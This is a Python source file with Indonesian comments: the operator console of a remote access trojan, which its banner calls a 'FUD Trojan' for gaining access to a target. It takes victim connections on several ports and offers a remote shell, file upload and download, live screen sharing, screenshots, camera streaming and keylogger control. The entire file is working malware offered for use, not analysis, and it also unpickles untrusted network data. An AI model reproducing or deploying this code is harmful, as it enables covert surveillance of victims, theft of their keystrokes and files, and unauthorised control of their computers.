import socket
import json
import os
import struct
import pickle
import cv2
import threading
import numpy as np

def tampilkan_banner():
    banner = """
    


████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗███████╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║╚════██║╚════██║
░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║░░███╔═╝░░███╔═╝
░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║██╔══╝░░██╔══╝░░
░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║███████╗███████╗
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚══════╝
    
    This is a FUD Trojan program that can gain access to the target.
    Make sure your target has already executed the trojan program!

        Commands:
        1. upload <filename>    (Upload a file to the target system)
        2. download <filename>  (Download a file from the target system)
        3. screen_share         (View the target's screen live)
        4. screen_shot          (Take a screenshot from the target)
        5. start_cam            (Activate the target's camera)
        6. start_logger         (Start the keylogger)
        7. baca_data            (Read data from the keylogger)
        8. stop_logger          (Stop the keylogger)

        Created by: A. Fakhrul Adani & Kevin Pangeran
    """
    print(banner)
    
def terima_data(target):
    """Menerima data JSON dari target."""
    data = ""
    while True:
        try:
            paket = target.recv(1024).decode(errors='ignore').rstrip()
            if not paket:
                break
            data += paket
            return json.loads(data)
        except json.JSONDecodeError:
            continue
        except ConnectionResetError:
            print("Koneksi terputus oleh target.")
            return None
    return None

def download_file(target, filename):
    """Mengunduh file dari target."""
    try:
        with open(filename, 'wb') as file:
            target.settimeout(2)
            metadata = target.recv(1024).decode()
            if not metadata:
                print("Gagal menerima metadata file.")
                return
            file_size = json.loads(metadata).get("size", 0)
            received = 0
            while received < file_size:
                chunk = target.recv(1024)
                if not chunk:
                    break
                file.write(chunk)
                received += len(chunk)
            target.settimeout(None)
    except Exception as e:
        print(f"Error saat mengunduh file: {e}")

def upload_file(target, filename):
    """Mengunggah file ke target."""
    try:
        with open(filename, 'rb') as file:
            file_size = os.path.getsize(filename)
            target.send(json.dumps({"size": file_size}).encode())
            while True:
                chunk = file.read(1024)
                if not chunk:
                    break
                target.send(chunk)
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan")
    except BrokenPipeError:
        print("Koneksi terputus saat mengunggah file.")

def receive_all(sock, size):
    """Pastikan menerima seluruh data sebesar 'size' byte"""
    data = b""
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            raise ConnectionError("Koneksi terputus saat menerima data.")
        data += packet
    return data

def konversi_byte_stream():
    """Menerima stream video dari target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 9998))
    sock.listen(5)
    print("Menunggu koneksi kamera ...")
    koneksi, addr = sock.accept()
    print(f"Terhubung ke kamera dari {addr}")
    
    payload_size = struct.calcsize("Q")  # 8 byte
    
    bdata = b""
    
    while True:
        # Pastikan menerima 8 byte pertama (ukuran frame)
        packet_msg_size = receive_all(koneksi, payload_size)
        if len(packet_msg_size) != payload_size:
            print("Data ukuran frame tidak lengkap. Menghentikan stream.")
            break
        
        msg_size = struct.unpack("Q", packet_msg_size)[0]

        # Pastikan menerima seluruh data frame
        frame_data = receive_all(koneksi, msg_size)

        # Decode frame dan tampilkan
        frame = pickle.loads(frame_data)
        cv2.imshow("Sedang merekam...", frame)
        key = cv2.waitKey(1)
        if key == 27:  # Tombol ESC untuk keluar
            break

    koneksi.close()
    cv2.destroyAllWindows()

def stream_cam():
    t = threading.Thread(target=konversi_byte_stream, daemon=True)
    t.start()
    
def konversi_byte_screen_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 9997))
    sock.listen(5)
    print("Menunggu koneksi screen recorder ...")
    koneksi, addr = sock.accept()
    print(f"Terhubung ke screen recorder dari {addr}")

    bdata = b""
    payload_size = struct.calcsize("i")

    while True:
        try:
            while len(bdata) < payload_size:
                packet = koneksi.recv(1024)
                if not packet:
                    print("Koneksi terputus oleh client.")
                    return
                bdata += packet

            packet_msg_size = bdata[:payload_size]
            bdata = bdata[payload_size:]
            msg_size = struct.unpack("i", packet_msg_size)[0]

            while len(bdata) < msg_size:
                packet = koneksi.recv(1024)
                if not packet:
                    print("Koneksi terputus saat menerima frame.")
                    return
                bdata += packet

            frame_data = bdata[:msg_size]
            bdata = bdata[msg_size:]

            # Perbaikan: Cek apakah data valid sebelum diproses
            try:
                frame = pickle.loads(frame_data)
                if not isinstance(frame, np.ndarray):
                    print("Frame yang diterima bukan NumPy array! Mengabaikan frame ini.")
                    continue

                # Perbaikan: Konversi ke BGR jika perlu
                if len(frame.shape) == 3 and frame.shape[2] == 3:
                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

                cv2.imshow("Sedang merekam screen...", frame)
                key = cv2.waitKey(1)
                if key == 27:  # ESC untuk keluar
                    break
            except Exception as e:
                print(f"Error saat memproses frame: {e}")
                continue
        except Exception as e:
            print(f"Terjadi kesalahan: {e}")
            break

    koneksi.close()
    cv2.destroyAllWindows()

def rekam_layar():
    t = threading.Thread(target=konversi_byte_screen_recorder)
    t.start()

def komunikasi_shell(target):
    n = 0
    while True:
        try:
            perintah = input('target_system>> ')
            if not perintah:
                continue
            target.send(json.dumps(perintah).encode())
            
            if perintah in ('exit', 'quit'):
                break
            elif perintah == 'clear':
                os.system('clear')
            elif perintah.startswith('cd '):
                pass
            elif perintah.startswith('download '):
                download_file(target, perintah[9:])
            elif perintah.startswith('upload '):
                upload_file(target, perintah[7:])
            elif perintah.startswith('start_logger'):
                print("Keylogger dimulai.")
            elif perintah.startswith('baca_data'):
                data = target.recv(1024).decode()
                print(data)
            elif perintah.startswith('stop_logger'):
                print("Keylogger dihentikan.")
            elif perintah.startswith('start_cam'):
                stream_cam()
            elif perintah.startswith('screen_shot'):
                n += 1
                with open(f"ss{n}.png", 'wb') as file:
                    target.settimeout(3)
                    while True:
                        chunk = target.recv(1024)
                        if not chunk:
                            break
                        file.write(chunk)
                    target.settimeout(None)
                print(f"Screenshot disimpan sebagai ss{n}.png")
            elif perintah.startswith('screen_share'):
                rekam_layar()
            else:
                hasil = terima_data(target)
                if hasil is not None:
                    print(hasil)
                else:
                    print("Koneksi terputus.")
                    break
        except ConnectionResetError:
            print("Koneksi terputus oleh target.")
            break
        except BrokenPipeError:
            print("Broken pipe error. Koneksi mungkin terputus.")
            break

def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(('0.0.0.0', 9999))
    soc.listen(1)
    print("Menunggu koneksi ...")
    target, ip = soc.accept()
    print(f"Terhubung ke {ip}")
    komunikasi_shell(target)
    soc.close()

if __name__ == "__main__":
    tampilkan_banner()  # Menampilkan WOTD sebelum eksekusi utama
    main()
